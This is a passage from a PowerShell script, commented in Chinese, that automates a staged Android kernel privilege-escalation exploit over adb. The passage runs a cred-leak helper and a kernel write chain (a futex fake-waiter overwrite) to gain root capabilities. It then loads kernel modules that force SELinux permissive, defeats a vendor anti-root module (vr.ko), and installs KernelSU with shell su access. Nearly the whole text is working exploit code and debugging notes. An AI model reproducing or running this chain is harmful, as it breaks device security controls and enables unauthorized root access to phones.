Shell ("echo 'STAGE4/5 start: host=" + (Get-Date -Format "HH:mm:ss") + " boot_id=$bid0' >> $dev_seq")
$cred = ''
for ($rr=1; $rr -le 3 -and -not $cred; $rr++) {
  Write-Output "STAGE4/5 ROUND $rr"
  Shell ("echo 'ROUND $rr start' >> $dev_seq")
  if (-not (Alive)) { Write-Output "STAGE4 DEVICE DOWN"; exit 1 }
  Shell "pgrep -f 'w2hos[t]_' | xargs -r kill 2>/dev/null"
  Start-Sleep -Seconds 2
  Shell "rm -f $dev_sock $dev_cred $dev_dbg $dev_proof $dev_task; W2_SOCK=$dev_sock W2_CRED=$dev_cred W2_DBG=$dev_dbg W2_PROOF=$dev_proof W2_TASK=$dev_task W2_CRED_IPS=$w2ips W2_IP_LO=$w2lo W2_IP_HI=$w2hi W2_CAND_MIN=$w2_cand_min W2_DIRECT_END=$w2_direct_end W2_KSETUP_SRC=$dev_ksud W2_KSETUP_MARK=/data/local/tmp/ksetup_$tag.txt nohup $dev_w2 > $dev_w2log 2>&1 &"
  $credline = ''
  for ($i=0; $i -lt 40; $i++) { Start-Sleep -Seconds 3; if (-not (Alive)) { Write-Output "STAGE4 DEVICE DOWN"; exit 1 }; $credline = Shell "cat $dev_cred 2>/dev/null"; if ($credline -and $credline.Length -gt 20 -and $credline -notmatch '^[\x00]+$') { break } }
  if (-not $credline -or $credline.Length -le 20) { Write-Output "STAGE4 ROUND $rr FAIL: no cred file"; continue }
  $cands = @()
  $credline -split ' ' | ForEach-Object { if ($_ -match '^ffffff[8cdef][0-9a-f]{9}$' -and $_ -ne '0000000000000000') { if ($cands -notcontains $_) { $cands += $_ } } }
  if ($cands.Count -eq 0) { Write-Output "STAGE4 ROUND $rr FAIL: candidates bad: $credline"; continue }
  Write-Output "STAGE4 ROUND $rr OK: candidates=$($cands -join ',')"
  foreach ($c in $cands) {
    if (-not (Alive)) { Write-Output "STAGE5 DEVICE DOWN (write panic?)"; exit 1 }
    $t = ('0x{0:x}' -f ([Convert]::ToUInt64($c,16) + $cap_off))
    Shell "rm -f $dev_proof $dev_crproof"
    $gl5 = Get-GLLock
    # STAGE5(默认, TASK_W2+capsym): 本机实测可靠路径 (开发机 3/3 成功)。
    # 写值用 capsym 而非 init_cred: init_cred 低32位 0x021205c8 缺
    # DAC_OVERRIDE(1)/SYS_ADMIN(21) -> STAGE6 INSMOD EPERM (实证, 20:04
    # 回归); capsym 候选已由 offsets_auto 按位16+位1/12/19/21 筛选。
    # configfs 路径 (GL_FOPS_HIJACK+GL_CRED) 在 b57 上劫持链即崩 (单 fd/全局
    # 均复现), 暂不可用; GL_CRED 代码保留在 glt 中待修。
    # WRITE 标记后 sync 落盘: panic 重启会丢 page cache (F2FS 回滚), 不 sync
    # 则 glt_seq 的 WRITE 行丢失 -> 无法定位崩溃点 (14:04/14:13 实测丢失)。
    # GL_SLIDE_ONLY=1 (根因修复): STAGE5 写链完成后 glt 立即退出, 不再执行
    # main.c 默认路径的 run_main_route_threads (fops 线程), 否则其 consumer
    # 的 futex_lock_pi 会第二次链走命中已被覆盖的假 waiter -> task_blocks_on
    # _rt_mutex -> 读垃圾 waiter->lock -> _raw_spin_trylock panic
    # (15:21/14:13 pstore 实证: futex_lock_pi 阻塞路径, 非 remove_waiter).
    # GL_FPAD=0: 同 STAGE1 (官方 Δ=0 对齐, words 表精确覆盖).
    Shell ("echo 'WRITE cand=$c gl5=$gl5 target=$t host=" + (Get-Date -Format "HH:mm:ss") + "' >> $dev_seq; sync; echo 'GL_USE_SLIDE=1 GL_EVENT_SYNC=1 GL_KEEP_CHAIN=1 GL_NO_SCHED=1 GL_NO_LOCKPI=1 GL_SLIDE_ONLY=1 GL_TASK_W2=1 GL_LOCK=$gl5 GL_TARGET=$t GL_INIT_CRED=$capsym GL_PROBE=1 GL_ATTEMPTS=1 timeout 20 $dev_glt > /data/local/tmp/w.log 2>&1' > /data/local/tmp/run.sh; chmod 755 /data/local/tmp/run.sh; nohup sh /data/local/tmp/run.sh >/dev/null 2>&1 &")
    $rp = ''
    for ($i=0; $i -lt 12; $i++) { Start-Sleep -Seconds 2; if (-not (Alive)) { Write-Output "STAGE5 DEVICE DOWN (write panic)"; exit 1 }; $rp = Shell "cat $dev_proof 2>/dev/null"; if ($rp -match 'CAPSROOT') { Write-Output "STAGE5 OK: $rp"; $cred=$c; break } }
    if ($cred) { break }
    Write-Output "STAGE5 candidate $c miss, next"
  }
}
if (-not $cred) { Shell ("echo 'STAGE5 FAIL after 3 rounds' >> $dev_seq"); Write-Output "STAGE5 FAIL: no CAPSROOT after 3 rounds"; exit 1 }
Start-Sleep -Seconds 3
if (-not (Alive)) { Write-Output "STAGE5 DEVICE DOWN after CAPSROOT"; exit 1 }
Shell ("echo 'STAGE5 OK cred=$cred' >> $dev_seq")
Write-Output "STAGE5 OK: CAPSROOT cred=$cred"
if ($SkipStage67) {
  Write-Output "STAGE5 OK (SkipStage67): CAPSROOT ready, modules/kernelsu SKIPPED (debug)"
  Mark "STAGE5 OK (SkipStage67)"
  exit 0
}

# ---- STAGE6: rootcmd + INSMOD permissive_restore (init 清零 GL 宿主) -> INSMOD 官方 ko ----
# 无限提权: 无论 permissive_restore 是否已加载, 都 rmmod + 重载新版
#   (init 里清零 __dump_skip.zeroes 4KB) -> GL_LOCK 槽位从 0 重新开始
#   -> 同 boot 内无限次提权, 无需重启. 清零时机 = insmod 时, 本次提权的
#   chain walk 已完成 (glt 已退出) -> 宿主不再被引用 -> 安全.
$id = Rootcmd "ID"
Write-Output "rootcmd: $id"
if ($id -notmatch 'uid=2000') { Write-Output "STAGE6 FAIL: rootcmd not online"; exit 1 }
# ---- 诊断: root 级日志快照 (只读 + 快照式命令, 不读写流式节点, 不会引发 panic; 重启后由 host 拉取) ----
Shell ("mkdir -p " + $dev_diagr)
Rootcmd ("EXEC dmesg > $dev_diagr/dmesg.txt 2>&1") | Out-Null
Rootcmd ("EXEC logcat -b kernel -d > $dev_diagr/logcat_kernel.txt 2>&1") | Out-Null
Rootcmd ("EXEC cat /proc/modules > $dev_diagr/modules.txt 2>&1") | Out-Null
Rootcmd ("EXEC getenforce > $dev_diagr/selinux.txt 2>&1") | Out-Null
Rootcmd ("EXEC cat /proc/sys/kernel/kptr_restrict > $dev_diagr/kptr.txt 2>&1") | Out-Null
Rootcmd ("EXEC cat /proc/uptime > $dev_diagr/uptime.txt 2>&1") | Out-Null
Write-Output "diag: root 级日志快照 -> $dev_diagr"

# 设备端模块名: v1.0 预编译资产内部 modinfo 名仍为 myroot (源自原资产字节,
# 未重新编译); 用源码重建后为 permissive_restore. 两者都接受.
$DEV_MOD = "permissive_restore"
if ((Shell "cat /proc/modules 2>/dev/null | grep -E '^(myroot|permissive_restore)'") -match '^myroot') {
  $DEV_MOD = "myroot"
}


$se_now = Shell "getenforce"
$mods_now = Shell "cat /proc/modules 2>/dev/null | grep -E '^(kernelsu|myroot|permissive_restore)'"
if ($mods_now -match 'kernelsu' -and $se_now -eq 'Enforcing') {
  Write-Output "STAGE6 FAIL: kernelsu loaded but enforcing (permissive_restore missing) -> rootcmd dead, REBOOT and rerun"
  exit 1
}
# ---- STAGE6.0a: clear_vr_tag 前置 (保护 permissive_restore 提权进程) ----
# 根因修复 (v1.3.5-beta2): vr.ko 在 sys_exit 杀"非root->root"提权进程。实证:
# permissive_restore INSMOD 的 commit_creds 提权后, 执行 init_module 的 rootcmd
# 子进程被杀 (socket 返回空, INSMOD 分支后续代码无机会执行) -> KSETUP 落位失败。
# clear_vr_tag 的 kretprobe commit_creds 会清 vr 标记 (tag_a/tag_b) +
# TIF_SYSCALL_TRACEPOINT (tp_flag), 前置加载后 permissive_restore 的提权子进程
# 存活, w2host INSMOD 分支的 KSETUP (root 窗口内落位 /data/adb/ksud) 才能执行。
$cc_addr = ''
foreach ($line in (Get-Content $KSYM_OUT)) {
  if ($line -match '^\s*([0-9a-fA-F]+)\s+T\s+commit_creds\s*$') { $cc_addr = '0x' + $matches[1]; break }
}
if ($KO_OFFICIAL -and $cc_addr) {
  if ((Shell "cat /proc/modules 2>/dev/null | grep -E '^clear_vr_tag'") -match 'clear_vr_tag') {
    Write-Output "STAGE6.0a: clear_vr_tag already loaded, skip INSMOD"
  } else {
    $vro = Get-VrOffsets
    $vrTagA = $vro.tagA; $vrTagB = $vro.tagB; $vrTp = $vro.tp
    Write-Output "STAGE6.0a: vr_offsets 来源: $($vro.src) (tag_a=$vrTagA tag_b=$vrTagB tp=$vrTp)"
    Write-Output "STAGE6.0a: INSMOD clear_vr_tag (前置, 防 vr.ko 杀提权进程) cc_addr=$cc_addr tag_a=$vrTagA tag_b=$vrTagB tp=$vrTp ..."
    $r = Rootcmd "INSMOD $dev_clear_vr_tag cc_addr=$cc_addr tag_a_off=$vrTagA tag_b_off=$vrTagB tp_flag=$vrTp"
    Write-Output "INSMOD clear_vr_tag ret: $r"
    Start-Sleep -Seconds 2
    $m = Shell "cat /proc/modules 2>/dev/null | grep '^clear_vr_tag'"
    if ($m -notmatch 'clear_vr_tag') {
      Write-Output "STAGE6.0a FAIL: clear_vr_tag 未加载 ('$m') -> 后续提权进程会被 vr.ko 杀, ksud 落位不可靠"
      exit 1
    }
    Write-Output "STAGE6.0a OK: $m"
  }
}
# permissive_restore: 总是重载 (清零 GL 宿主) — skipped with -SkipPermissiveRestore
if ($PERM_RESTORE_SRC) {
  if ($mods_now -match "$DEV_MOD") {
    Write-Output "STAGE6: RMMOD 旧 $DEV_MOD (重载清零 GL 宿主) ..."
    $rr = Rootcmd "RMMOD $DEV_MOD"
    Start-Sleep -Seconds 2
    if (-not (Alive)) { Write-Output "STAGE6 DEVICE DOWN after RMMOD"; exit 1 }
  }
  Write-Output "STAGE6: INSMOD $dev_perm_restore selinux_state_p0=$se_p0 gl_zeroes_p0=$GL_LOCK_BASE (init 清零 GL 宿主) ..."
  $r = Rootcmd "INSMOD $dev_perm_restore selinux_state_p0=$se_p0 gl_zeroes_p0=$GL_LOCK_BASE"
  Write-Output "INSMOD permissive_restore ret: $r"
  Start-Sleep -Seconds 3
  if (-not (Alive)) { Write-Output "STAGE6 DEVICE DOWN after permissive_restore INSMOD"; exit 1 }
  $mod = Shell "cat /proc/modules | grep '^$DEV_MOD'"
  if ($mod -notmatch "$DEV_MOD") {
    Write-Output "STAGE6 FAIL: permissive_restore not loaded: $r"
    $dm = Rootcmd "READ /dev/kmsg"
    if ($dm -and $dm.Length -gt 4 -and $dm -notmatch '^ERR') {
      $dlines = $dm -split "`n"
      Write-Output "--- /dev/kmsg tail (from READ) ---"
      $dlines | Select-Object -Last 40
      Write-Output "--- end kmsg ---"
    } else {
      Write-Output "kmsg READ: $dm"
      $dm2 = Rootcmd "EXEC logcat -b kernel -d 2>&1 | tail -40"
      Write-Output "--- logcat kernel tail ---"
      Write-Output $dm2
      Write-Output "--- end logcat ---"
    }
    exit 1
  }
} else {
  Write-Output "STAGE6 SKIP: -SkipPermissiveRestore (permissive_restore not loaded; enforcing stays)"
}
# ---- STAGE6.0: ksud 落位校验 (root 窗口内完成, kernelsu INSMOD 之前) ----
# 根因修复 (v1.3.5-beta2): KernelSU sucompat 把所有 su 调用重定向执行
# /data/adb/ksud; 该文件缺失时 su 全灭 ("su: inaccessible or not found")。
# CAPSROOT 的 cap_permitted = capsym (KASLR 随机), rootcmd 文件操作不可靠
# (缺 CAP_DAC_OVERRIDE 时 CP/CHMOD/STAT 全 EACCES, 回归实测)。确定性方案:
# permissive_restore INSMOD 的 init 执行 commit_creds(init_cred) -> 执行
# init_module 的 rootcmd 子进程被提为 uid0+全caps, w2host INSMOD 分支在
# init_module 成功后 (W2_KSETUP_SRC/W2_KSETUP_MARK 注入) 直接落位
# /data/adb/ksud 并写标记文件 (INSMOD 的 socket 返回不可靠, 标记文件兜底)。
# 此处只校验标记文件 (adb 可读), 不依赖 rootcmd 随机 caps。
if ($KO_OFFICIAL -and $PERM_RESTORE_SRC) {
  Write-Output "STAGE6.0: 校验 root 窗口 ksud 落位 (ksetup 标记)..."
  $ksetup_mark = "/data/local/tmp/ksetup_$tag.txt"
  $mk = Shell "cat $ksetup_mark 2>/dev/null"
  if ($mk -notmatch 'KSETUP_OK' -or $mk -notmatch 'size=4556352') {
    Write-Output "STAGE6.0 FAIL: ksud 未在 root 窗口内落位 (ksetup 标记: '$mk')"
    Write-Output "STAGE6.0 diag: w2host 日志尾部:"
    Shell "tail -20 $dev_w2log 2>/dev/null" | ForEach-Object { Write-Output "  $_" }
    exit 1
  }
  Write-Output "STAGE6.0 OK: /data/adb/ksud 已由 root 窗口落位 ($mk)"
}
# kernelsu: in-tree ko by default (-KsuKoPath / $env:KSU_KO_PATH to override);
# idempotent if already loaded
if ($mods_now -match 'kernelsu') {
  Write-Output "STAGE6: kernelsu already loaded, skip INSMOD"
} elseif ($KO_OFFICIAL) {
  # allow_shell=1: KernelSU 原生参数 -> adb shell(uid 2000) 直接允许 su
  # (sucompat 重定向生效) -> STAGE8 用 `su -c` 启动 ksud daemon.
  # 比写 /data/adb/ksu/.allowlist 更干净: 不碰 KernelSU 配置, 侵入最小.
  Write-Output "STAGE6: INSMOD $dev_ksu (kernelsu allow_shell=1) ..."
  $r = Rootcmd "INSMOD $dev_ksu allow_shell=1"
  Write-Output "INSMOD kernelsu ret: $r"
  Start-Sleep -Seconds 6
  if (-not (Alive)) { Write-Output "STAGE6 DEVICE DOWN after kernelsu INSMOD"; exit 1 }
  $mod = Shell "cat /proc/modules | grep '^kernelsu'"
  if ($mod -notmatch 'kernelsu') { Write-Output "STAGE6 FAIL: module not in /proc/modules: '$mod'"; exit 1 }
  Write-Output "STAGE6 OK: $mod"
} else {
  Write-Output "STAGE6: kernelsu.ko not provided (set KSU_KO_PATH) - KSU stage skipped"
}
# 槽位状态重置 (宿主已由 permissive_restore init 清零; skip 模式下宿主未清零, 保留状态)
$bid = (Shell "cat /proc/sys/kernel/random/boot_id 2>/dev/null").Trim()
if ($bid -and $PERM_RESTORE_SRC) { Set-Content $GL_STATE ("$bid`n0"); Write-Output "STAGE6: GL 宿主已清零, 槽位重置 -> 无限提权" }
elseif ($bid) { Write-Output "STAGE6: -SkipPermissiveRestore, GL 宿主未清零 (槽位状态保留)" }

# ---- STAGE6.1: ksud 就位后 su 首验 (kernelsu 加载后, sucompat 生效) ----
# STAGE6.0 已在 kernelsu 加载前用 rootcmd 落位 /data/adb/ksud; 此处仅在
# kernelsu 加载后验证 su 链路 (sucompat -> /data/adb/ksud -> root shell)。
# 失败不 exit (由 STAGE7 门禁统一裁决), 但打印完整诊断供定位。
if ($KO_OFFICIAL) {
  $kchk = Shell "su -c 'head -c 4 /data/adb/ksud 2>/dev/null | xxd -p'"
  if ($kchk -eq '7f454c46') {
    Write-Output "STAGE6.1 OK: su -> /data/adb/ksud ELF OK"
  } else {
    Write-Output "STAGE6.1 FAIL: su 链路异常 ('$kchk')"
    $st = Rootcmd "STAT /data/adb/ksud"
    Write-Output "STAGE6.1 diag: rootcmd STAT /data/adb/ksud -> '$st' (rootcmd 可能已被 KSU 阻断)"
    $su_id = Shell "su -c 'id' 2>&1 | head -1"
    Write-Output "STAGE6.1 diag: su -c id -> '$su_id'"
  }
}

# ---- STAGE6.5: vr.ko 反 root 对抗 (clear_vr_tag) ----
# 必须在内核/manager 使用前加载: kretprobe commit_creds 只在"非root->root"
# 提权时清 vr 标记 + TIF_SYSCALL_TRACEPOINT, 否则 KernelSU libksud.so 提权
# 进程被 vr.ko 在 sys_exit 杀 -> manager "获取 root 失败" + UI 空白.
$cc_addr = ''
foreach ($line in (Get-Content $KSYM_OUT)) {
  if ($line -match '^\s*([0-9a-fA-F]+)\s+T\s+commit_creds\s*$') { $cc_addr = '0x' + $matches[1]; break }
}
if ($cc_addr) {
  if ((Shell "cat /proc/modules 2>/dev/null | grep -E '^clear_vr_tag'") -match 'clear_vr_tag') {
    Write-Output "STAGE6.5: clear_vr_tag already loaded, skip INSMOD"
  } else {
    # vr.ko 对抗偏移: Get-VrOffsets 查找顺序 = 机型模块 devices/<id>/vr_offsets.json
    # (extract_vr_from_img.py 对对应固件 vr.ko 提取) -> tools/scripts/vr_offsets.json
    # (b57 实证值) -> 内置默认值+WARN。
    $vro = Get-VrOffsets
    $vrTagA = $vro.tagA; $vrTagB = $vro.tagB; $vrTp = $vro.tp
    Write-Output "STAGE6.5: vr offsets 来源: $($vro.src) (tag_a=$vrTagA tag_b=$vrTagB tp=$vrTp)"
    Write-Output "STAGE6.5: INSMOD clear_vr_tag cc_addr=$cc_addr tag_a=$vrTagA tag_b=$vrTagB tp=$vrTp ..."
    # rootcmd socket 在 INSMOD kernelsu 后已被 KSU 阻断 (见 STAGE6 注释),
    # 此处改用 su -c insmod (STAGE6 allow_shell=1 已生效)。
    $r = Shell "su -c 'insmod $dev_clear_vr_tag cc_addr=$cc_addr tag_a_off=$vrTagA tag_b_off=$vrTagB tp_flag=$vrTp' 2>&1"
    Write-Output "INSMOD clear_vr_tag ret: $r"
    Start-Sleep -Seconds 2
    $m = Shell "cat /proc/modules 2>/dev/null | grep '^clear_vr_tag'"
    if ($m -notmatch 'clear_vr_tag') { Write-Output "STAGE6.5 FAIL: clear_vr_tag not loaded: '$m'" }
    else { Write-Output "STAGE6.5 OK: $m" }
  }
} else {
  Write-Output "STAGE6.5 WARN: commit_creds not found in kallsyms - clear_vr_tag skipped"
}

# ---- STAGE7: 等 permissive_restore 延迟线程 (25s) 恢复 permissive + 全量验证 ----
if ($PERM_RESTORE_SRC) {
  $perm_back = $false
  for ($i=0; $i -lt 15; $i++) {
    Start-Sleep -Seconds 3
    if (-not (Alive)) { Write-Output "STAGE7 DEVICE DOWN (panic?)"; exit 1 }
    if ((Shell "getenforce") -eq 'Permissive') { $perm_back = $true; break }
  }
} else {
  Start-Sleep -Seconds 5  # short settle; no permissive restore expected
}
$se = Shell "getenforce"
$mods = Shell "cat /proc/modules 2>/dev/null | grep -E '^(kernelsu|myroot|permissive_restore)'"
Write-Output "STAGE7: selinux=$se"
Write-Output "STAGE7: modules=$mods"
if ($PERM_RESTORE_SRC) {
  if ($se -ne 'Permissive') { Write-Output "STAGE7 FAIL: still enforcing (permissive_restore 未生效?)"; exit 1 }
  if ($mods -notmatch "$DEV_MOD") { Write-Output "STAGE7 FAIL: $DEV_MOD module missing"; exit 1 }
} else {
  Write-Output "STAGE7: -SkipPermissiveRestore -> enforcing expected; permissive_restore module check skipped"
}
if ($KO_OFFICIAL -and $mods -notmatch 'kernelsu') { Write-Output "STAGE7 FAIL: kernelsu module missing"; exit 1 }
# ---- STAGE7 门禁增强 (v1.3.5-beta2): 真实校验 su 与 ksud, 杜绝假 PASS ----
if ($KO_OFFICIAL) {
  $su_id = Shell "su -c 'id' 2>&1 | head -1"
  Write-Output "STAGE7: su -c id -> $su_id"
  if ($su_id -notmatch 'uid=0') {
    Write-Output "STAGE7 FAIL: su 不可用 ('$su_id'), KSU userspace 未就位"
    exit 1
  }
  $kst = Shell "su -c 'head -c 4 /data/adb/ksud 2>/dev/null | xxd -p'"
  Write-Output "STAGE7: /data/adb/ksud head -> $kst"
  if ($kst -ne '7f454c46') {
    Write-Output "STAGE7 FAIL: /data/adb/ksud 缺失或损坏 ('$kst')"
    exit 1
  }
  Write-Output "STAGE7: su + ksud 真实验证通过"
}
$ver = ''
if ($KO_OFFICIAL) { $ver = Shell "$dev_ksud debug version 2>&1 | head -2"; Write-Output "ksud version: $ver" }
$ping = Shell "ping -c 3 -W 2 223.5.5.5 2>&1 | tail -2"
Write-Output "ping: $ping"
Write-Output "uptime: $(Shell 'cat /proc/uptime')"
if ($KO_OFFICIAL) {
  if ($ver -match '32525') { Write-Output "=== ALL STAGES PASS: Permissive + KSU 32525 + $DEV_MOD Live + 网络通 ===" }
  else { Write-Output "WARN: version line: $ver" }
} else {
  Write-Output "=== ALL STAGES PASS (no KSU): Permissive + $DEV_MOD Live + 网络通 ==="
}
Shell ("echo 'ALL STAGES PASS host=" + (Get-Date -Format "HH:mm:ss") + "' >> $dev_seq") | Out-Null

# ---- STAGE8: ksud 就位 (sucompat 重定向目标) + manager 注册 + ksud daemon ----
# 根因修复 (v1.3.4): KernelSU sucompat 把 su 调用重定向执行 /data/adb/ksud。
# 主链此前只把 ksud push 到 /data/local/tmp/ksud_$tag; 一旦 /data/adb/ksud
# 缺失或被破坏 (如 ksud install 半途失败), 所有 su 全部失败
# ("su: inaccessible or not found") -> manager 模块页/超级用户页永久转圈。
# 此处先确保 /data/adb/ksud 为完整 ELF, 再注册 manager (ksud debug get-sign,
# 内核据此识别 manager uid 自动放行), 最后启动 ksud daemon。
$su_test = Shell "su -c 'id' 2>&1 | head -1"
if ($su_test -match 'uid=0') {
  Write-Output "STAGE8: su works ($su_test), installing ksud + registering manager ..."
  $ktype = Shell "su -c 'head -c 4 /data/adb/ksud 2>/dev/null | xxd -p'"
  if ($ktype -ne '7f454c46') {
    Shell "su -c 'cp $dev_ksud /data/adb/ksud && chmod 755 /data/adb/ksud'" | Out-Null
    Write-Output "STAGE8: /data/adb/ksud repaired (head-4 was '$ktype', now full ELF)"
  } else {
    Write-Output "STAGE8: /data/adb/ksud already ELF (no repair needed)"
  }
  $mgrPath = (Shell "pm path me.weishu.kernelsu 2>/dev/null | head -1") -replace '^package:',''
  if ($mgrPath -and $mgrPath -match '\.apk$') {
    $sig = Shell "su -c '$dev_ksud debug get-sign $mgrPath 2>&1'"
    Write-Output "STAGE8: manager get-sign: $sig"
  } else {
    Write-Output "STAGE8 WARN: manager apk not found (pm path), get-sign skipped"
  }
  Shell "su -c 'nohup /data/adb/ksud services > /data/local/tmp/ksud_$tag.log 2>&1 &'"
  Start-Sleep -Seconds 3
  $ksud = Shell "ps -A -o PID,ARGS 2>/dev/null | grep -F ksud | grep -v grep | head -2"
  if ($ksud) { Write-Output "STAGE8 OK: ksud daemon up: $ksud" }
  else {
    Write-Output "STAGE8 INFO: ksud daemon not detected (services 命令一次性退出属正常; manager 自带 libksud.so 不依赖常驻 ksud)"
    $kl = Shell "cat /data/local/tmp/ksud_$tag.log 2>/dev/null | head -5"
    Write-Output "ksud log: $kl"
  }
} else {
  Write-Output "STAGE8 WARN: su not working for shell ($su_test) - ksud daemon skipped"
}

Write-Output "DONE"
